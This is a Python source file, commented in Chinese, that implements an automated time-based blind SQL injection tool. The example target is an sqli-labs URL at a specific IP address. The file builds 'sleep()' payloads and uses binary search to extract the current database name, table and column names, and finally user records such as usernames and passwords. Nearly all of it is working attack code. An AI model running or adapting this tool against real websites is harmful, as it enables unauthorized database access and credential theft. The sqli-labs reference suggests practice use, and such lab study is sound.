'''
    延时注入
    
'''

import requests
import sys
import test_bihe
'''
    定义
'''

class T(object):
    def __init__(self,URL):
        '''
            url : 攻击方URL 如：http://114.55.107.51/sqli-labs/Less-9/
            cMode ：闭合方式
        '''
        self.url = URL
        self.cmode = test_bihe.bihefangshi(self.url)

    def getTime(self, url):
        try:
            res = requests.get(url, timeout=2)
        except Exception as e:
            return "timeout"
        return res.text

    # 判断能否使用延时注入
    def isTimeSQLI(self):
        testPayload = "?id=1" + self.cmode + "+and+sleep(2)%23"
        fullURL = self.url + testPayload
        # print(fullURL)
        if "timeout" in self.getTime(fullURL):
            return "yes"
        return "error"

    # 判断响应状态
    def http_get(self, payload):
        result = self.url + payload
        # print(result)
        if "timeout" in self.getTime(result):
            return True
        else:
            return False

    # 二分法
    def half(self, l, h, payload):
        low = l
        high = h
        while low <= high:
            mid = (low + high) / 2
            # ?id=1' and if(length(database())=8,1,sleep(5))--+
            mid_payload = "?id=1" + self.cmode + " and if(%s > %d ,sleep(2),1) --+" % (payload, mid)
            # print(mid_payload)
            # print(mid_html)
            if self.http_get(mid_payload):
                low = mid + 1
            else:
                high = mid - 1
        mid = int((low + high + 1) / 2)
        return mid

    def getResult(self, key):
        Name = ""
        #print("[*]Name getting...")
        payload = "length((" + key + "))"
        NameLen = self.half(0, 1000, payload)
        for i in range(1, NameLen + 1):
            payload = "ascii(substr((" + key + ")," + str(i) + ",1))"
            mid = self.half(0, 126, payload)
            Name = Name + chr(mid)
          #  print("[+]The Name is ", Name)
        return Name

    # 得到当前数据库名
    def getCurrentDbName(self):
        key = "database()"
        tableName = self.getResult(key)
        return tableName

        # 得到数据库表名

    def getTableName(self, key):
        key = "select group_concat(table_name separator ';') from information_schema.tables where table_schema='" + key + "'"
        tableName = self.getResult(key)
        return tableName

    # 获取表中字段名
    def getColumnName(self, key):
        key = "select group_concat(column_name separator ';') from information_schema.columns where table_schema=database() and table_name='" + key + "'"
        columnName = self.getResult(key)
        return columnName

    # 获取用户信息
    def getUserInfo(self, key1, key2, key3):
        key = "select group_concat(" + key1 + ",':'," + key2 + " separator ';') from " + key3 + ""
        userInfo = self.getResult(key)
        return userInfo
